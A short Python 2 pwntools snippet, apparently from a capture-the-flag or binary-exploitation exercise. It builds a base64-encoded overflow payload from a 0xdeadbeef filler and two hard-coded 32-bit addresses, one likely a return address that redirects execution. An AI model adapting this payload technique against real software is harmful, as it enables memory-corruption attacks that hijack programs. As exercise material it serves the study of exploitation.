```python
from pwn import *
import base64
print "INPUT : " + base64.b64encode(p32(0xdeadbeef) + p32(0x804925f) + p32(0x0811C9EC))
```
